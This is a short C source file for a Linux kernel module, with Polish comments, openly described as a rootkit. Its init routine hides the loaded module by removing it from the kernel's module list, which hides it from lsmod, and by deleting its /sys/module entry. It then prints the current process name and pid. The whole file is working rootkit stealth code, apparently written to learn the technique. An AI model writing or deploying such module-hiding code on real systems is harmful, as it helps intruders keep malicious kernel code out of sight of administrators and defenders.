#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/init.h>
#include <linux/list.h>

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dawid Paluchowski");
MODULE_DESCRIPTION("Rootkit - jesli mnie widzisz, cos poszlo nie tak");
// Zmienne
// statio zastosowane w celu unikniecia wpisu w /proc/kallsyms
static struct list_head* previousModule;
static int isHidden = 0;

// Chowanie aktywnego modulu w listingu lsmoddo tego modulu
// Wykorzystane funkcje:
//   lista dwukierunkowa Kernel-API:
//    list_del_init(list_head elementDoUsuniecia)
//    list_add(list_head nowyElement, list_head poprzednikNowego);
void hideModule(){
  if(isHidden != 1) {
    // Chowanie aktywnego modulu w listingu lsmod
    previousModule = THIS_MODULE -> list.prev;
    list_del_init(&THIS_MODULE -> list); // Usuniecie wezla z listy i jej reinicjalizacja
    // Chowanie modulu w folderze /sys/module
    kobject_del(&THIS_MODULE -> mkobj.kobj);
    isHidden = 1;
  }
}

static int __init rkit_init(void) {
  hideModule();
  printk(KERN_INFO "Hello world!\n");
  printk(KERN_INFO "(Rootkit)Ten proces to \"%s\" (pid %i)\n", current->comm, current->pid);
  return 0;
}

static void __exit rkit_cleanup(void) {
  printk(KERN_INFO "Czyszczenie po module.\n");
}

module_init(rkit_init);
module_exit(rkit_cleanup);
